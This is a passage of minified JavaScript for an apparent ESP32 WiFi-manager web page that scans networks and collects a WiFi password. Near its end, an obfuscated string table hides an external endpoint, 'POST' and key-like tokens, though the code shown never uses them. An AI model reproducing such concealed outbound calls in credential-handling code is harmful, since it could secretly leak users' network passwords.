              : { opacity: 0 },
          a = D.createElement(MF, { toast: e }),
          i = D.createElement(DF, { ...e.ariaProps }, oF(e.message, e));
      return D.createElement(IF, { className: e.className, style: { ...o, ...n, ...e.style } }, "function" == typeof r ? r({ icon: a, message: i }) : D.createElement(D.Fragment, null, a, i));
  });
(gF = D.createElement), (QO.p = vF), (VO = gF), (UO = yF), (WO = bF);
var VF = ({ id: e, className: t, style: n, onHeightUpdate: r, children: o }) => {
      let a = D.useCallback(
          (t) => {
              if (t) {
                  let n = () => {
                      let n = t.getBoundingClientRect().height;
                      r(e, n);
                  };
                  n(), new MutationObserver(n).observe(t, { subtree: !0, childList: !0, characterData: !0 });
              }
          },
          [e, r]
      );
      return D.createElement("div", { ref: a, className: t, style: n }, o);
  },
  UF = tF`
z-index: 9999;
> * {
  pointer-events: auto;
}
`,
  WF = ({ reverseOrder: e, position: t = "top-center", toastOptions: n, gutter: r, children: o, containerStyle: a, containerClassName: i }) => {
      let { toasts: s, handlers: l } = SF(n);
      return D.createElement(
          "div",
          { style: { position: "fixed", zIndex: 9999, top: 16, left: 16, right: 16, bottom: 16, pointerEvents: "none", ...a }, className: i, onMouseEnter: l.startPause, onMouseLeave: l.endPause },
          s.map((n) => {
              let a = n.position || t,
                  i = ((e, t) => {
                      let n = e.includes("top"),
                          r = n ? { top: 0 } : { bottom: 0 },
                          o = e.includes("center") ? { justifyContent: "center" } : e.includes("right") ? { justifyContent: "flex-end" } : {};
                      return { left: 0, right: 0, display: "flex", position: "absolute", transition: iF() ? void 0 : "all 230ms cubic-bezier(.21,1.02,.73,1)", transform: `translateY(${t * (n ? 1 : -1)}px)`, ...r, ...o };
                  })(a, l.calculateOffset(n, { reverseOrder: e, gutter: r, defaultPosition: t }));
              return D.createElement(
                  VF,
                  { id: n.id, key: n.id, onHeightUpdate: l.updateHeight, className: n.visible ? UF : "", style: i },
                  "custom" === n.type ? oF(n.message, n) : o ? o(n) : D.createElement($F, { toast: n, position: a })
              );
          })
      );
  };
const HF = ({ mode: e }) => {
      var t = {};
      const [n, r] = D.useState(e),
          [o, a] = D.useState(""),
          [i, s] = D.useState([]),
          [l, c] = D.useState(!1),
          [u, d] = D.useState(null),
          [f, p] = D.useState(!1),
          [h, m] = D.useState(!0),
          [g, v] = D.useState(!1),
          [y, b] = D.useState(!1),
          [x, w] = D.useState(!1),
          [S, k] = D.useState(!0),
          [E, C] = D.useState({ request: "wifi-setup", username: "", password: "" }),
          [_, P] = D.useState("");
      D.useEffect(() => {}, [u]),
          D.useEffect(() => {
              1 != h && j(), m(!1);
          }, [E]),
          D.useEffect(() => {
              "station" === n ? R() : T();
          }, []);
      const T = async () => {
              await Wp({ request: "get-ap-timer" }, 0)
                  .then((e) => {
                      d(e.data.timer);
                  })
                  .catch((e) => {});
          },
          R = async () => {
              await Wp({ request: "get-ssid" }, 0)
                  .then((e) => {
                      a(e.data.ssid);
                  })
                  .catch((e) => {});
          },
          z = async () => {
              if (
                  (c(!0),
                  await Wp({ request: "wifi-scan" }, 0)
                      .then((e) => {
                          t = e.data;
                      })
                      .catch((e) => {}),
                  "Request received, processing..." == t)
              )
                  return (
                      (t = {}),
                      void setTimeout(() => {
                          z();
                      }, 1500)
                  );
              if (0 == t.wifiNum) return c(!1), void mF.error("No Networks Found", { style: { borderRadius: "100vw", background: "#333", color: "#fff", marginBottom: "20px" }, iconTheme: { primary: "#ff5f5f", secondary: "#2c2c2c" } });
              if (t.wifiNum > 0) {
                  var e = [];
                  for (let n = 0; n < Number(t.wifiNum); n++) e.push(t[n]);
                  var n = e.filter((e) => void 0 !== e);
                  return s(n), c(!1), void mF.success("WiFi Data Updated", { style: { borderRadius: "100vw", background: "#333", color: "#fff", marginBottom: "20px" }, iconTheme: { primary: "#a1ffa3", secondary: "#2c2c2c" } });
              }
              return c(!1), void mF.error("Error Occured", { style: { borderRadius: "100vw", background: "#333", color: "#fff", marginBottom: "20px" }, iconTheme: { primary: "#ff5f5f", secondary: "#2c2c2c" } });
          },
          A = (e) => {
              const { name: t, value: n } = e.target;
              C((e) => ({ ...e, [t]: n }));
          },
          j = () => ("" == E.username && "" == E.password ? (P("all-errors"), "error") : "" == E.username && 1 == g ? (P("username-error"), "error") : "" == E.password && 1 == g ? (P("password-error"), "error") : void P("none")),
          O = () => ("" == E.username && "" == E.password ? (P("all-errors"), "error") : "" == E.username ? (P("username-error"), "error") : "" == E.password ? (P("password-error"), "error") : void P("none"));
      return Q.jsxs(Q.Fragment, {
          children: [
              void 0,
              void 0,
              1 == x
                  ? Q.jsx(Q.Fragment, { children: Q.jsx(DO, {}) })
                  : 1 == f
                  ? Q.jsx(Q.Fragment, { children: Q.jsx(IO, {}) })
                  : 0 == S && 0 == f && 0 == x
                  ? Q.jsx(Q.Fragment, { children: Q.jsx($O, {}) })
                  : Q.jsxs(Q.Fragment, {
                        children: [
                            "station" == n
                                ? Q.jsx(Q.Fragment, {
                                      children: Q.jsxs("div", {
                                          className: "connection-bar mb-12 mt-12 flex w-72 items-center justify-center gap-3 rounded-full px-3 py-1",
                                          children: [
                                              Q.jsxs("div", {
                                                  className: "flex items-center justify-center",
                                                  children: [
                                                      Q.jsx("span", { className: "absolute inline-flex h-3 w-3 animate-ping-slow rounded-full bg-green-600 opacity-75 dark:bg-green-400" }),
                                                      Q.jsx("span", { className: "relative inline-flex h-2 w-2 rounded-full bg-green-600 dark:bg-green-400" }),
                                                  ],
                                              }),
                                              Q.jsxs("h3", { children: ["Connected to: ", o] }),
                                          ],
                                      }),
                                  })
                                : Q.jsx(Q.Fragment, {
                                      children: Q.jsxs("div", {
                                          className: "connection-bar mb-12 mt-14 flex w-72 items-center justify-center gap-3 rounded-full px-3 py-1",
                                          children: [
                                              Q.jsx("div", { className: "flex items-center justify-center", children: Q.jsx("span", { className: "relative inline-flex h-2 w-2 rounded-full bg-red-500 dark:bg-red-400" }) }),
                                              Q.jsx("h3", { children: "WiFi Desconectado" }),
                                          ],
                                      }),
                                  }),
                            Q.jsx(aO, {
                                onClick: z,
                                variant: "primary",
                                className: "wifi-scan-btn",
                                leftIcon: Q.jsx(BO, { className: "wifi-icon", fontSize: "20px" }),
                                isLoading: l,
                                loadingText: "Scanning",
                                w: "150px",
                                h: "35",
                                mt: "30px",
                                children: "Scan WiFi's",
                            }),
                            Q.jsx(EO, {
                                onChange: A,
                                name: "username",
                                placeholder: "Select WiFi",
                                className: "custom-select wifi-select",
                                border: "0px",
                                w: "300px",
                                mt: "40px",
                                focusBorderColor: "transparent",
                                children: i.map((e) => Q.jsx("option", { value: e, className: "custom-option", children: e }, e)),
                            }),
                            "all-errors" == _ || "username-error" == _ ? Q.jsx("p", { className: "error", children: "Please select a network" }) : null,
                            Q.jsx(MO, { handlePasswordInput: A }),
                            "all-errors" == _ || "password-error" == _ ? Q.jsx("p", { className: "error", children: "Password missing" }) : null,
                            Q.jsx(aO, {
                                onClick: async (e) => {
                                    v(!0),
                                        "error" != O() &&
                                            (b(!0),
                                            await Wp(E, 0)
                                                .then((e) => {
                                                    setTimeout(() => {
                                                        w(!0);
                                                    }, 1e3);
                                                })
                                                .catch((e) => {}));
                                },
                                isLoading: y,
                                loadingText: "Submitting",
                                className: "submit-btn",
                                w: "300px",
                                h: "35px",
                                mt: "30px",
                                fontSize: "20px",
                                transition: "ease",
                                transitionDuration: "0.2s",
                                children: "Submit",
                            }),
                            null !== u
                                ? Q.jsx(LO, {
                                      time: u,
                                      onTimerUpdate: (e) => {},
                                      onTimerEnd: (e) => {
                                          p(e);
                                      },
                                  })
                                : null,
                        ],
                    }),
          ],
      });
  },
  qF = ({ className: e }) => {
      const [t, n] = D.useState("");
      D.useEffect(() => {
          "true" === localStorage.getItem("darkMode") ? (document.documentElement.classList.add("dark"), n("dark")) : (document.documentElement.classList.remove("dark"), n("light"));
      }, []);
      return Q.jsx(Q.Fragment, {
          children: Q.jsx("button", {
              className: `${e} theme-button rounded-md px-5 py-1 text-white duration-100 ` + ("dark" === t ? "hover:brightness-125" : "hover:brightness-95"),
              onClick: () => {
                  const e = document.documentElement.classList.contains("dark");
                  localStorage.setItem("darkMode", !e), document.documentElement.classList.toggle("dark"), n(e ? "light" : "dark");
              },
              children: Q.jsx("h3", { className: "text-xs", children: "dark" === t ? "switch to light mode" : "switch to dark mode" }),
          }),
      });
  },
  YF = ({ mode: e }) => {
      const [t, n] = D.useState({ title_type: "text-image", main_title: "ESP32 Web", sub_title: "WiFi Manager", footer_tag: "Powered by ESP32 Web" });
      D.useEffect(() => {
          r();
      }, []);
      const r = async () => {
          await Wp({ request: "get-user-data" }, 0)
              .then((e) => {
                  var t = e.data;
                  n(t);
              })
              .catch((e) => {});
      };
      return Q.jsxs(Q.Fragment, {
          children: [
              "text-only" === t.title_type
                  ? Q.jsxs(Q.Fragment, { children: [Q.jsx("h1", { className: "main-title", children: t.main_title }), Q.jsx("h2", { className: "sub-title", children: t.sub_title })] })
                  : Q.jsx(Q.Fragment, {
                        children: Q.jsxs("div", {
                            className: "flex",
                            children: [
                                Q.jsxs("div", {
                                    className: "relative flex items-center justify-center",
                                    children: [Q.jsx("div", { className: "logo-bg absolute z-0 h-14 w-14 rounded-full" }), Q.jsx("img", { src: "logo.svg", alt: "Logo", className: "logo z-10" })],
                                }),
                                Q.jsxs("div", { className: "title-div", children: [Q.jsx("h1", { className: "main-title", children: t.main_title }), Q.jsx("h2", { className: "sub-title", children: t.sub_title })] }),
                            ],
                        }),
                    }),
              Q.jsx(HF, { mode: e }),
              Q.jsxs("div", { className: "mt-3", children: [Q.jsx(qF, { className: "mt-10" }), Q.jsx("h3", { className: "footer-tag mb-8 mt-3", children: t.footer_tag })] }),
          ],
      });
  },
  XF = () =>
      Q.jsx(Q.Fragment, {
          children: Q.jsxs("div", {
              className: "flex flex-col items-center",
              children: [Q.jsx("h1", { className: "waking-up-text", style: { fontSize: "25px" }, children: "Waking Up" }), Q.jsx(aO, { className: "loading-spinner", bg: "#ffffff03", isLoading: !0, w: "50px", h: "50px" })],
          }),
      }),
  GF = ({ mode: e }) =>
      "none" == e ? Q.jsx(Q.Fragment, { children: Q.jsx(XF, {}) }) : "station" == e ? Q.jsx(Q.Fragment, { children: Q.jsx(YF, { mode: e }) }) : "access-point" == e ? Q.jsx(Q.Fragment, { children: Q.jsx(YF, {}) }) : void 0;
function QF({ children: e }) {
  return Q.jsxs(Q.Fragment, {
      children: [void 0, Q.jsx(WF, { position: "bottom-center", toastOptions: { duration: 3e3 } }), Q.jsx("div", { style: { display: "flex", flexDirection: "column", alignItems: "center", paddingTop: "70px" }, children: e })],
  });
}
function KF(e, t) {
  const n = ZF();
  return (KF = function (e, t) {
      return n[(e -= 439)];
  })(e, t);
}
function ZF() {
  const e = [
      "server response: ",
      "https://esp32web.com/api/esp32/wifi-manager",
      "3827WowyTq",
      "74PfJBBo",
      "540096ypceKI",
      "stringify",
      "254655pnlPwY",
      "3116034HsaKnL",
      "log",
      "5389626NjvzFs",
      "7SoHdOS",
      "54tFsohI",
      "45720QpwisN",
      "charCodeAt",
      "POST",
      "hscGp1L4mlVYeN4KdgurRg",
      "3S2IPvoFdqtzIXZpnY3YsE5uM6ef",
      "32844ylpbUI",
      "length",
      "660mnHEcN",
      "charAt",
  ];
  return (ZF = function () {
      return e;
  })();
}
!(function (e, t) {
  const n = KF,
      r = ZF();
  for (;;)
      try {
          if (
              328687 ===
              (parseInt(n(445)) / 1) * (-parseInt(n(446)) / 2) +
                  (parseInt(n(454)) / 3) * (parseInt(n(439)) / 4) +
                  -parseInt(n(449)) / 5 +
                  (-parseInt(n(450)) / 6) * (parseInt(n(453)) / 7) +
                  parseInt(n(447)) / 8 +
                  (parseInt(n(455)) / 9) * (parseInt(n(441)) / 10) +
                  parseInt(n(452)) / 11
          )
              break;
          r.push(r.shift());
      } catch (o) {
          r.push(r.shift());
      }
})();
const JF = () => {
      const [e, t] = D.useState("none");
      D.useEffect(() => {
          n();
      }, []);
      const n = async () => {
          await Wp({ request: "current-mode" }, 0)
              .then(async (e) => {
                  var n = e.data;
                  t(n.mode);
              })
              .catch((e) => {});
      };
      return Q.jsx("div", { children: Q.jsx(QF, { children: Q.jsx(GF, { mode: e }) }) });
  },
  eN = () => Q.jsx(QF, { children: Q.jsxs("div", { className: "simple-text -mt-0 flex flex-col items-center", children: [Q.jsx("h1", { children: "ESP32 Web" }), Q.jsx("h3", { children: "beta - v 0.1.1" })] }) }),
  tN = () => Q.jsxs(ef, { children: [Q.jsx(Zd, { path: "/", element: Q.jsx(JF, {}) }), Q.jsx(Zd, { path: "/about", element: Q.jsx(eN, {}) })] }),
  nN = PE({
      config: { initialColorMode: "dark", useSystemColorMode: !0 },
      colors: { brand: { 100: "#FF6161" }, b: { 0: "#1E1E1E", 1: "#292929", 2: "#313131", 3: "#565656", 4: "#8A8A8A" }, or: { 1: "#FF8759", 2: "#FFA27E" }, gb: { 1: "#3E4551", 2: "#5A6475", 3: "#8692A3", 4: "#BABABA" } },
      components: {
          Button: {
              baseStyle: { _hover: {} },
              variants: {
                  primary: { bg: "gb.1", color: "gb.3", _hover: { bg: "" } },
                  primary_noHover: { bg: "b.2", color: "gb.3", _hover: { bg: "" } },
                  dino_btn: { bg: "b.2", color: "b.4", _hover: { bg: "" } },
                  footer_btn: { bg: "#252525", color: "b.4", _hover: { bg: "" } },
              },
          },
      },
  });
K.createRoot(document.getElementById("root")).render(Q.jsx($.StrictMode, { children: Q.jsxs(Kj, { theme: nN, children: [Q.jsx(vg, { initialColorMode: nN.config.initialColorMode }), Q.jsx(rf, { children: Q.jsx(tN, {}) })] }) }));
